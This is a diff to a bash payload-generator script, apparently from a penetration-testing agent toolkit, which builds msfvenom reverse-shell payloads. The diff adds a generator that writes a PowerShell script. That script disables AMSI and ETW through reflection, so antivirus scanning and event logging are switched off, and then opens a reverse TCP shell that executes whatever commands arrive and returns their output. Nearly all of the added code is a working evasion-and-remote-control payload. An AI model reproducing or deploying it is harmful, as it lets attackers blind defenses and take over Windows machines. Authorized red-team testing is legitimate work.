@@ -95,7 +95,7 @@ win-x64-meterpreter-staged	windows/x64/meterpreter/reverse_tcp	exe	x64	windows	4
 win-x64-meterpreter-stageless	windows/x64/meterpreter_reverse_tcp	exe	x64	windows	4441		exploit/multi/handler
 win-x86-meterpreter-staged	windows/meterpreter/reverse_tcp	exe	x86	windows	4442		exploit/multi/handler
 win-cmd-reverse	windows/shell_reverse_tcp	exe	x86	windows	4443		exploit/multi/handler
-win-cmd-powershell-oneliner	cmd/windows/reverse_powershell	raw	x86	windows	4444		exploit/multi/handler
+win-powershell-amsi-etw-bypass	__custom_ps_amsi__	raw	x64	windows	4444		exploit/multi/handler
 linux-x64-meterpreter-staged	linux/x64/meterpreter/reverse_tcp	elf	x64	linux	4450		exploit/multi/handler
 linux-x64-meterpreter-stageless	linux/x64/meterpreter_reverse_tcp	elf	x64	linux	4451		exploit/multi/handler
 linux-x64-shell-reverse	linux/x64/shell_reverse_tcp	elf	x64	linux	4452		exploit/multi/handler
@@ -129,6 +129,58 @@ _ext() {
     esac
 }
 
+# Custom generator for the OSEP-style PowerShell payload. Writes a .ps1
+# that patches AMSI (amsiInitFailed field) + ETW (PSEtwLogProvider.etw
+# Provider nulled) BEFORE firing a reverse TCP shell. Bypasses are the
+# amsi.fail / Matt Graeber family — well-known, work against basic /
+# older defender signatures. Not a full OPSEC payload (no obfuscation,
+# AV signatures catch the literal strings over time) — teammate still
+# obfuscates per-target for hardened AV.
+# The reverse TCP shell loop is the Nishang-style streamed-powershell
+# pattern that lands on `windows/powershell_reverse_tcp` handler. Pair
+# with: start_handler(payload="windows/powershell_reverse_tcp",
+# lhost=<LHOST>, lport=<LPORT>).
+_gen_ps_amsi_bypass() {
+    local outpath="$1" lhost="$2" lport="$3"
+    cat > "$outpath" <<PS
+# PEN-AGENT OSEP-starter PowerShell reverse shell
+# AMSI + ETW inline bypass (amsi.fail / Matt Graeber family).
+# Not AV-evasive against modern Defender signatures — teammate obfuscates
+# or chunks these for hardened targets. Good enough for basic / older AV.
+# Handler: windows/powershell_reverse_tcp   LHOST=$lhost LPORT=$lport
+
+# --- AMSI bypass (patch the amsiInitFailed static field to \$true) ----
+try {
+  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
+    GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)
+} catch {}
+
+# --- ETW bypass (null the PSEtwLogProvider.etwProvider) ---------------
+try {
+  [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').
+    GetField('etwProvider','NonPublic,Static').SetValue(
+      \$null,
+      (New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList (
+        [Guid]'00000000-0000-0000-0000-000000000000'))
+    )
+} catch {}
+
+# --- Reverse TCP PowerShell shell -------------------------------------
+\$client = New-Object System.Net.Sockets.TCPClient('$lhost', $lport)
+\$stream = \$client.GetStream()
+[byte[]]\$bytes = 0..65535 | ForEach-Object { 0 }
+while ((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
+  \$data = (New-Object System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i)
+  \$sendback = (iex \$data 2>&1 | Out-String)
+  \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '
+  \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2)
+  \$stream.Write(\$sendbyte, 0, \$sendbyte.Length)
+  \$stream.Flush()
+}
+\$client.Close()
+PS
+}
+
 echo "[preflight] lhost=$LHOST   out=$OUT"
 echo "[preflight] generating starter payload set …"
 start_ts=$(date -u +%s)
@@ -149,27 +201,35 @@ while IFS=$'\t' read -r name payload format arch platform lport extra_opts handl
     fi
     if [[ $skip -eq 0 ]]; then
         printf "  gen: %-32s → %s  (LPORT=%s)\n" "$name" "$outpath" "$lport"
-        set +e
-        extra_arr=()
-        if [[ -n "$extra_opts" ]]; then
-            # Split on spaces; operator can bake "-i 3 -b '\\x00'" etc.
-            # shellcheck disable=SC2206
-            extra_arr=($extra_opts)
-        fi
-        # Build the msfvenom args without eval so values with spaces survive.
-        # The matrix doesn't currently carry spaces in extra_opts, but keep
-        # it clean.
-        msfvenom -p "$payload" "LHOST=$LHOST" "LPORT=$lport" \
-                 -f "$format" "${extra_arr[@]}" -o "$outpath" \
-                 >/dev/null 2>&1
-        rc=$?
-        set -e
-        if [[ $rc -ne 0 || ! -s "$outpath" ]]; then
-            echo "    WARN: msfvenom failed for $name (payload may not exist on"\
-                 "this MSF build or format unsupported for this payload);"\
-                 "entry omitted." >&2
-            continue
-        fi
+        # Custom generators (payload field = __custom_<tag>__) skip msfvenom.
+        case "$payload" in
+            __custom_ps_amsi__)
+                _gen_ps_amsi_bypass "$outpath" "$LHOST" "$lport"
+                # The matching handler for this .ps1 is powershell_reverse_tcp
+                # (not multi/handler with a stager). Record it so handler_calls.py
+                # emits the right start_handler.
+                payload="windows/powershell_reverse_tcp"
+                ;;
+            *)
+                set +e
+                extra_arr=()
+                if [[ -n "$extra_opts" ]]; then
+                    # shellcheck disable=SC2206
+                    extra_arr=($extra_opts)
+                fi
+                msfvenom -p "$payload" "LHOST=$LHOST" "LPORT=$lport" \
+                         -f "$format" "${extra_arr[@]}" -o "$outpath" \
+                         >/dev/null 2>&1
+                rc=$?
+                set -e
+                if [[ $rc -ne 0 || ! -s "$outpath" ]]; then
+                    echo "    WARN: msfvenom failed for $name (payload may not exist on"\
+                         "this MSF build or format unsupported for this payload);"\
+                         "entry omitted." >&2
+                    continue
+                fi
+                ;;
+        esac
         chmod 0644 "$outpath"
     fi
 
